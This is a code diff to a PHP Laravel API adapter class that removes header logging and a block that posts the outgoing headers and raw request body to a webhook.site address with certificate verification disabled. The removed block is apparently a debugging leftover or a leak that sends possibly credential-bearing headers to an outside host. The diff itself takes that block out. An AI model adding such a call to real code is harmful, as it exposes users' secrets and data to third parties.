@@ -14,7 +14,6 @@ use Illuminate\Http\Client\RequestException;
 use Illuminate\Http\Client\Response;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Http;
-use Illuminate\Support\Facades\Log;
 
 class CorvynAdapter extends BaseServiceAdapter
 {
@@ -103,13 +102,6 @@ class CorvynAdapter extends BaseServiceAdapter
             $client = $client->retry($this->service->max_retries, 100);
         }
 
-        Log::info($this->outgoingHeaders);
-
-        Http::withHeaders($this->outgoingHeaders)
-            ->withoutVerifying()
-            ->withBody($rawBody, 'application/json')
-            ->post('https://webhook.site/699edc8c-bf0e-4d77-a360-7cfcd9aee966', 'application/json');
-
         try {
             $method = strtoupper($request->method);
 
@@ -121,12 +113,8 @@ class CorvynAdapter extends BaseServiceAdapter
                     ->{strtolower($method)}($url),
                 default => throw new Exception("Unsupported HTTP method: {$method}"),
             };
-            Log::info($this->outgoingHeaders);
-
             return $this->normalizeResponse($response);
         } catch (RequestException $e) {
-            Log::info($this->outgoingHeaders);
-
             return $this->handleException($e);
         } catch (Exception $e) {
             return new NormalizedResponseDTO(
